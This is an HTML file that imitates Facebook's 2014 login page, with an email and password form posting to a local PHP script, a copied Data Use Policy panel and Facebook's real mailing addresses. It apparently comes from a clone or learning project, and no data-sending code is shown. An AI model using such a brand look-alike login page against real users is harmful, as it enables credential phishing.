<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <link rel="shortcut icon" href="loginImg/title.jpg" />
    <title>Welcome to Facebook-Login</title>
    <link type="text/css" href="css/login.css" rel="stylesheet"></link>
 <link type="text/css" href="css/datapolicy.css" rel="stylesheet"></link>
       <script type="text/javascript" src="jquery/jquery-1.11.1.js"></script>
<script src="jquery/forgotPassword.js" type="text/javascript"></script>

   </head>
<body>
    <div id="header">
        <div id="facebook">
            <a href="login.php" style="color:white;">facebook</a>
        </div>
	<form action="login-exec.php" method="post" name="form2" id="form2" onSubmit="return logvalidate()">
  
        <div class="login">
            <span class="loginText">Email or Phone &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
                &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Password</span>
            <br />
            <input type="text" ID="login" name="login" class="textBox">
            &nbsp &nbsp
            <input type="password" ID="password1" name="password1" class="textBox">
           <input type="submit" name="submit" id="submit" class="loginButton" value="Log In">
            
            <br />
            <span class="smallerText">
                <input type="checkbox" ID="CheckBox1"/>
               <span > Keep me logged in </a>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
                &nbsp; &nbsp; <a href="forgotPassword.html" style=color:#9C9CCC;">Forgot your password?</a> </span>
        </div>
    </div>
	</form>
	
	<div class="dataPanel">
	<div class="fbinfobox "><a class="link" href="#">Learn more</a> about cookies and similar technologies.</div>
	<br/>
	<div class="allPanel">
	<div class="dataHeading">Data Use Policy</div>
	</div>
	<hr/>
	<div class="dataPanelleft"><a href="#" class="link">Information we receive and how it is used</a>
	<br/>
	<span class="smallsize">
	Learn about the types of information we receive, and how that information is used.
	</span>

	<br/>
	<br/>
	
	<a href="#" class="link">Sharing and finding you on Facebook</a>	
	<span class="smallsize">
	<br/>Get to know the privacy settings that help you control your information on facebook.com.
	</span>

	<br/><br/>
	<a href="#" class="link">Other websites and applications</a>	
	<span class="smallsize">
	<br/>Learn about things like social plugins and how information is shared with the games, applications and websites you and your friends use off Facebook.
	</span>

	<br/>
	<br/>
	
	<a href="#" class="link">Advertising and Facebook content</a>	
	<span class="smallsize">
	<br/>
	See how ads are served without sharing your information with advertisers, and understand how we pair ads with social context.
	</span>

	<br/>
	<br/>
	
	<a href="#" class="link">Cookies, pixels and other similar technologies</a>	
	<span class="smallsize">
	<br/>
	 Find out how cookies, pixels and tools (like local storage) are used to provide you with services, features and relevant ads and content.
	</span>	

	<br/>
	<br/>
	
	<a href="#" class="link">Some other things you need to know</a>	
	<span class="smallsize">
	<br/>
	Learn how we make changes to this policy and more.
	</span>
	</div>

	<div class="rightdataPanel">
	<div class="smallBlueBox">
	<img class="lef"src="images/policy.png"/>
	
	If you have questions or complaints regarding our Data Use Policy or 
	practices, please contact us by mail. If you are located in the U.S. or 
	Canada, our mailing address is Facebook Inc., 1601 Willow Road, Menlo Park, 
	CA 94025. If you are located outside the U.S. or Canada, our mailing address is Facebook Ireland Ltd., 4 Grand Canal Square, Grand Canal Harbour Dublin 2, Ireland. 
	Registered in Ireland (Companies Registration Office) Company No. 462932. 
	You may also contact us through this <a href="" class="link">help page.</a> 
	</div>

	<br/>
	<span class="resource">
	More resources</span>
	<br/>
	
	<ul type="square">
	<li><a href="#" class="link">Interactive Tools</a></li>
	<li><a href="#" class="link">Minors and Safety</a></li>
	<li><a href="#" class="link">Facebook Privacy Page</a></li>
	<li><a href="#" class="link">Facebook Safety Page</a></li>
	<li><a href="#" class="link">Facebook Site Governance Page</a></li>
	<li><a href="#" class="link">Facebook Ad Controls</a></li>
	<li><a href="#" class="link">View the complete Data Use Policy</a></li>
	</ul>
	</div>
	</div>	


	<div class="datafooter">
	<a href="#" class="link">Mobile</a> &nbsp;   &nbsp;&nbsp;   &nbsp;   &nbsp;  <a href="#" class="link">Find Friends</a>  &nbsp;  &nbsp;  &nbsp;   &nbsp;   <a href="#" class="link">Badges</a>   &nbsp;   &nbsp; &nbsp;   &nbsp;   <a href="#" class="link">People</a> &nbsp;   &nbsp;   &nbsp; &nbsp;    <a href="#" class="link">Pages</a> &nbsp;&nbsp;    &nbsp;   &nbsp;    <a href="#" class="link">Places</a> &nbsp; &nbsp;   &nbsp;   &nbsp;    <a href="#" class="link">Games</a>&nbsp; &nbsp;   &nbsp;   &nbsp;    <a href="#" class="link">Locations</a>&nbsp;   &nbsp;   &nbsp;    <a href="#" class="link">About</a>
	<br>
	<a class="link" href="#">Create Ad</a> &nbsp;   &nbsp;   &nbsp;  <a href="CreatePage.html" class="link">Create Page</a>  &nbsp;   &nbsp;   &nbsp;   <a href="#" class="link">Developers</a>   &nbsp;   &nbsp;   &nbsp;   <a href="#" class="link">Career</a> &nbsp;   &nbsp;   &nbsp; &nbsp;    <a href="#" class="link">Privacy</a> &nbsp;   &nbsp;   &nbsp;&nbsp;     <a href="#" class="link">Cookies</a> &nbsp;   &nbsp;   &nbsp;  &nbsp;   <a href="#" class="link">Terms</a>&nbsp;   &nbsp;  &nbsp;  &nbsp;    <a href="#" class="link">Help</a>
	<br><br>
	<span style="color:grey;">Facebook &copy; 2014</span>
	<br>
	<a href="#" class="link">English (US)</a>
	</div>


	